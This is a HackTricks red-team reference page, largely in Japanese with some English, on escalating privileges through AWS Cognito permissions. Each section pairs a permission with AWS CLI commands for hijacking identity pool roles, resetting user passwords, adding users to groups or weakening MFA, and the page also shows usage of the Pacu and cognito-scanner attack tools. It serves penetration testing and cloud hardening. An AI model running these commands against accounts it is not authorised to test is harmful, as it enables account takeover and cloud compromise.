# AWS - Cognito特権昇格

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じて、ゼロからヒーローまでAWSハッキングを学びましょう</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)をフォローする
- **ハッキングトリックを共有するには、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください**

</details>

## Cognito

Cognitoに関する詳細情報は次を参照してください：

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### ツール

- [Pacu](https://github.com/RhinoSecurityLabs/pacu)は、AWSの脆弱性フレームワークであり、現在、「cognito\_\_enum」と「cognito\_\_attack」モジュールを含んでおり、アカウント内のすべてのCognitoアセットの列挙を自動化し、弱い構成、アクセス制御に使用されるユーザ属性などをフラグ付けし、変更可能なカスタム属性に基づいてユーザーの作成（MFAサポートを含む）や特権昇格を自動化し、使用可能なアイデンティティプール資格情報、IDトークン内の引き受け可能なロールなどを行います。

モジュールの機能の説明については、[ブログ記事](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)の第2部を参照してください。インストール手順については、[Pacu](https://github.com/RhinoSecurityLabs/pacu)のメインページを参照してください。

#### 使用法

指定されたアイデンティティプールとユーザープールクライアントに対してユーザー作成とすべての特権昇格ベクトルを試行するためのcognito\_\_attackのサンプル使用法：
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
```plaintext
現在のAWSアカウントで表示されるすべてのユーザープール、ユーザープールクライアント、アイデンティティプール、ユーザーなどを収集するためのcognito\_\_enumのサンプル使用法：
```
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner)は、Cognitoにさまざまな攻撃を実装したPythonのCLIツールであり、privescエスカレーションも含まれています。

#### インストール
```bash
$ pip install cognito-scanner
```
#### 使用法
```bash
$ cognito-scanner --help
```
For more information check https://github.com/padok-team/cognito-scanner

### Gathering credentials from Identity Pool

As Cognito can grant **IAM role credentials** to both **authenticated** an **unauthenticated** **users**, if you locate the **Identity Pool ID** of an application (should be hardcoded on it) you can obtain new credentials and therefore privesc (inside an AWS account where you probably didn't even have any credential previously).

For more information [**check this page**](../aws-unauthenticated-enum-access/#cognito).

**Potential Impact:** Direct privesc to the services role attached to unauth users (and probably to the one attached to auth users).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

With this permission you can **grant any cognito role** to the authenticated/unauthenticated users of the cognito app.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
### `cognito-identity:update-identity-pool`

この権限を持つ攻撃者は、例えば、自分が制御するCognitoユーザープールや、他のどんなアイデンティティプロバイダーにも設定できます。そこで、そのユーザープロバイダーに**ログイン**するだけで、Identity Poolで構成された認証済みロールにアクセスできるようになります。
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
**この権限を悪用して基本認証を許可することも可能です**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**潜在的影響**: アイデンティティプール内で構成された認証済みIAMロールが侵害される可能性があります。

### `cognito-idp:AdminAddUserToGroup`

この権限は、**CognitoユーザーをCognitoグループに追加**することを許可します。したがって、攻撃者はこの権限を悪用して、自分の管理下のユーザーを**より優れた**権限や**異なるIAMロール**を持つ他のグループに追加することができます。
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**潜在的影響:** 他のCognitoグループやユーザープールグループにアタッチされたIAMロールへの権限昇格。

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

これらの権限を持つ攻撃者は、**すべてのIAMロールを作成/更新**し、**侵害されたCognito Identity Providerで使用できるIAMロール**を持つ侵害されたユーザーをグループの一部として作成することができ、これによりすべてのロールにアクセスできます:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**潜在的影響:** 他のCognito IAMロールへの権限昇格。

### `cognito-idp:AdminConfirmSignUp`

この権限は**サインアップを確認**することを可能にします。デフォルトでは誰でもCognitoアプリケーションにサインインできますが、これが残されている場合、ユーザーは任意のデータでアカウントを作成し、この権限で確認できます。
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**潜在的影響:** 新しいユーザーを登録できる場合、認証済みユーザーのアイデンティティプールIAMロールへの間接的な昇格が可能になります。 任意のアカウントを確認できることで、他のアプリ機能への間接的な昇格が可能になります。

### `cognito-idp:AdminCreateUser`

この権限を持つと、攻撃者はユーザープール内に新しいユーザーを作成できます。 新しいユーザーは有効な状態で作成されますが、パスワードを変更する必要があります。
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**潜在的影響:** 認証済みユーザーのアイデンティティプールIAMロールへの直接的な権限昇格。任意のユーザーを作成できるため、他のアプリ機能への間接的な権限昇格も可能です。

### `cognito-idp:AdminEnableUser`

この権限は、無効化されたユーザーの資格情報を見つけた攻撃者が、そのユーザーを再度**有効にする**必要がある非常に特殊なケースで役立ちます。
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**潜在的影響:** 認証済みユーザーのアイデンティティプールIAMロールへの間接的な権限昇格、および攻撃者が無効化されたユーザーの資格情報を持っている場合のユーザーの権限への権限昇格。

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

この権限は、[**ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**メソッド**を使用してログインすることを可能にします。詳細については、リンクを参照してください。

### `cognito-idp:AdminSetUserPassword`

この権限により、攻撃者は**任意のユーザーのパスワードを変更**できるようになり、MFAが有効になっていないユーザーをなりすますことができます。
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**潜在的影響:** 潜在的に任意のユーザーへの直接権限昇格が可能であり、各ユーザーが所属するすべてのグループへのアクセスおよびIdentity Pool認証済みIAMロールへのアクセスが可能となります。

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: 攻撃者は、この権限を悪用して、自分がコントロールする携帯電話をユーザーの**SMS MFA**として設定する可能性があります。
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** 前述のものと同様に、この権限は、ユーザーのMFA設定をバイパスするために使用できます。
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: 前述のものと同様に、この権限はユーザープールのMFA設定を変更してMFA保護をバイパスするために使用できます。
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** ユーザープールを更新してMFAポリシーを変更することも可能です。[こちらのcliを確認してください](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html)。

**潜在的影響:** 攻撃者が資格情報を知っている任意のユーザーに間接的な権限昇格を行い、MFA保護をバイパスする可能性があります。

### `cognito-idp:AdminUpdateUserAttributes`

この権限を持つ攻撃者は、自分の管理下のユーザーのメールアドレスや電話番号などの属性を変更して、基盤となるアプリケーションでより多くの特権を取得しようとすることができます。\
これにより、メールアドレスや電話番号を変更して検証済みと設定することができます。
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**潜在的影響:** Cognitoユーザープールを使用して特権を与えるアプリケーション内での潜在的な間接的な特権昇格。

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

この権限を持つ攻撃者は、既存のプールクライアントよりも**制限の少ない新しいユーザープールクライアントを作成**できます。たとえば、新しいクライアントは、任意の認証方法を許可し、秘密を持たず、トークンの取り消しを無効にし、トークンの有効期間を延長することができます...

同じことが、新しいクライアントを作成する代わりに、**既存のクライアントを変更**することで行うこともできます。

[**コマンドライン**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html)（または[**更新コマンド**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)）では、すべてのオプションを確認できます。
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**潜在的影響:** ユーザープールによって使用される Identity Pool の認可ユーザーへの潜在的な間接的な権限昇格が可能になり、セキュリティ対策を緩和する新しいクライアントを作成することで、攻撃者が作成できたユーザーでログインすることが可能になります。

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

この権限を悪用すると、攻撃者は新しいユーザーを CSV でアップロードして作成することができます。
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**潜在的影響:** 認証済みユーザーのアイデンティティプールIAMロールへの直接的な権限昇格。任意のユーザーを作成できるため、他のアプリ機能への間接的な権限昇格も可能です。

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

攻撃者は新しいアイデンティティプロバイダーを作成し、その後このプロバイダーを通じて**ログイン**することができます。
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**潜在的影響:** 認証済みユーザーのアイデンティティプールIAMロールへの直接の権限昇格。任意のユーザーを作成できるため、他のアプリ機能への間接的な権限昇格。

### cognito-sync:\* 分析

これは、Cognito Identity Poolsのロールにデフォルトで設定されている非常に一般的な権限です。許可設定にワイルドカードが含まれていると、（特にAWSから来ている場合は）常に悪い印象を与えますが、**攻撃者の視点から見ると、与えられた権限はあまり有用ではありません**。

この権限により、アイデンティティプールとアイデンティティID内のユーザー情報を読み取ることができます（これは機密情報ではありません）。\
アイデンティティIDには、[**Datasets**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) が割り当てられている場合があり、これはセッションの情報（AWSでは**セーブドゲーム**と定義されています）です。これには機密情報が含まれる可能性がありますが、確率は非常に低いです。この情報にアクセスする方法については、[**列挙ページ**](../aws-services/aws-cognito-enum/)で確認できます。

攻撃者は、これらの権限を使用して、これらのデータセットに変更を公開するCognitoストリームに自分自身を登録したり、Cognitoイベントでトリガーされる**lambda**に登録したりすることができます。これが使用されているのを見たことはありませんし、ここに機密情報があることを期待することはできませんが、不可能ではありません。
